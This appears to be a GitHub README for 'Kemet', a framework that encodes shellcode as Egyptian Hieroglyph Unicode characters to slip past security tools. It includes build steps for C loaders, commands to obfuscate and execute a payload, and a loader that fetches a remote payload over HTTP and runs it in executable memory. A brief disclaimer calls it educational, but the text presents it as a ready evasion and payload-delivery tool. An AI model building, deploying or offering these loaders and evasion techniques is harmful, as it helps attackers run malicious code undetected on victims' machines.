🛡️ Kemet Shellcode Obfuscation & Loading Framework
<p align="center">
<img src="https://i.imgur.com/6s1Y3pJ.png" alt="Kemet Logo" width="600">
</p>

<p align="center">
<a href="https://github.com/yourusername/kemet/releases">
<img src="https://img.shields.io/github/release/yourusername/kemet.svg" alt="Latest Release">
</a>
<a href="https://github.com/yourusername/kemet/blob/master/LICENSE">
<img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License">
</a>
<a href="https://github.com/yourusername/kemet/actions">
<img src="https://img.shields.io/github/workflow/status/yourusername/kemet/CI" alt="Build Status">
</a>
</p>

Kemet is an advanced shellcode obfuscation and loading framework that uses Unicode characters to hide malicious payloads. It consists of a Python obfuscator and multiple C loaders for different deployment scenarios.

🚀 Features
Unicode-based Obfuscation: Transforms shellcode into Unicode text that bypasses many security solutions
Multiple Loading Methods: Local file loader and HTTP-based remote loader
Cross-platform Compatibility: Works on Windows systems with proper compiler
Memory-safe Operations: Proper allocation and protection of executable memory
Minimal Footprint: Lightweight implementation with no unnecessary dependencies
📦 Installation
Prerequisites
Python 3.x
C compiler (GCC/Clang on Linux, MSVC on Windows)
Windows SDK (for Windows-specific APIs)
Build Instructions
Clone the repository:
bash

Line Wrapping

Collapse
Copy
1
2
git clone https://github.com/yourusername/kemet.git
cd kemet
Build the C loaders:
bash

Line Wrapping

Collapse
Copy
1
2
3
4
5
6
7
# On Linux with MinGW
x86_64-w64-mingw32-gcc -o kemet_loader.exe kemet_loader.c -lwininet
x86_64-w64-mingw32-gcc -o kemet_http_loader.exe kemet_http_loader.c -lwininet

# On Windows with MSVC
cl kemet_loader.c wininet.lib
cl kemet_http_loader.c wininet.lib
🔧 Usage
Step 1: Obfuscate Your Shellcode
bash

Line Wrapping

Collapse
Copy
1
python obfuscate.py shellcode.bin -o obfuscated.txt
Step 2: Load and Execute
Local File Loader
bash

Line Wrapping

Collapse
Copy
1
kemet_loader.exe obfuscated.txt
HTTP Remote Loader
bash

Line Wrapping

Collapse
Copy
1
kemet_http_loader.exe http://example.com/obfuscated.txt
🛠️ How It Works
Obfuscation Process:
The Python script reads binary shellcode
Each byte is converted to a Unicode character using a base offset (0x13000)
The resulting Unicode text is saved to a file
Loading Process:
The C loader reads the Unicode text
It decodes each character back to its original byte value
The shellcode is allocated in executable memory
Memory protections are adjusted for execution
The shellcode is executed as a function
HTTP Loading:
Downloads the obfuscated Unicode text from a remote URL
Follows the same decoding and execution process as the local loader
🧪 Technical Details
Unicode Obfuscation Technique
The framework uses a simple but effective technique:

Each shellcode byte (0-255) is mapped to a Unicode character in the range 0x13000-0x130FF
This range is part of the Egyptian Hieroglyphs block, making the obfuscated text appear as hieroglyphs
Security solutions often don't scan for executable content in this Unicode range
Memory Protection
The loaders implement proper memory protection:

Allocate memory with PAGE_EXECUTE_READWRITE
Copy shellcode to the allocated memory
Change protection to PAGE_EXECUTE_READ
Execute the shellcode as a function
⚠️ Security Considerations
This tool is designed for educational and authorized security testing purposes only
Always ensure you have proper authorization before using these tools
The obfuscation technique may not bypass all security solutions
Use responsibly and in accordance with applicable laws and regulations
🤝 Contributing
Contributions are welcome! Please feel free to submit a Pull Request. For major changes, please open an issue first to discuss what you would like to change.

Development Guidelines
Follow the existing code style
Add comments to explain complex parts of the code
Test your changes thoroughly
Update documentation as needed
📄 License
This project is licensed under the MIT License - see the LICENSE file for details.

🙏 Acknowledgments
Inspired by various shellcode loading techniques
Thanks to the security research community for their valuable insights
📞 Contact
If you have any questions or suggestions, feel free to open an issue or contact us at [your-email@example.com].

<p align="center">
<i>"In the world of cybersecurity, knowledge is both the shield and the sword."</i>
</p>
